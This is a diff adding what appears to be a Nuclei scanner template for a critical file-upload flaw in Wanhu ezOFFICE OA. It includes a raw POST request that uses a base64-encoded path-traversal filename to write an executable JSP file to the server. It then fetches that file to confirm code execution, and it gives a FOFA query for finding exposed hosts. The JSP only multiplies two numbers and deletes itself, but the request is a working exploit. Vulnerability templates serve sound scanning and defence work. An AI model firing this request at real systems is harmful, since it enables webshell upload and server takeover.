@@ -1,0 +1,54 @@
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - status_code_2 == 200
+    - contains(body_2, "{{result}}")
+    type: dsl
+  raw:
+  - 'POST /defaultroot/public/iWebOfficeSign/OfficeServer.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: text/plain
+
+
+    DBSTEP V3.0     145             0               106             DBSTEP=REJTVEVQ
+
+    OPTION=U0FWRUZJTEU=
+
+    RECORDID=
+
+    isDoc=dHJ1ZQ==
+
+    moduleType=Z292ZG9jdW1lbnQ=
+
+    FILETYPE={{filepath}}
+
+    <% out.print({{num1}}*{{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();
+    %>
+
+    '
+  - 'GET /defaultroot/public/edit/{{filename}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: wanhu-ezoffice-officeserver-fileupload
+info:
+  author: Co5mos
+  description: "\u4E07\u6237 ezOFFICE OA `officeserver` \u5B58\u5728\u6587\u4EF6\u4E0A\
+    \u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u6F0F\u6D1E\u4E0A\
+    \u4F20 webshell\uFF0C\u4ECE\u800C\u63A7\u5236 web \u670D\u52A1\u5668\u7684\u6743\
+    \u9650\u3002\n"
+  metadata:
+    fofa-query: banner="OASESSIONID" && banner="/defaultroot/"
+  name: Wanhu ezOFFICE OA OfficeServer File Upload
+  severity: critical
+  tags: fileupload, wanhu, ezoffice, rce
+variables:
+  filename: '{{rand_base(6)}}.jsp'
+  filepath: '{{base64("//../../public/edit/{{filename}}")}}'
+  num1: '{{rand_int(10000, 20000)}}'
+  num2: '{{rand_int(10000, 20000)}}'
+  result: '{{to_number(num1)*to_number(num2)}}'
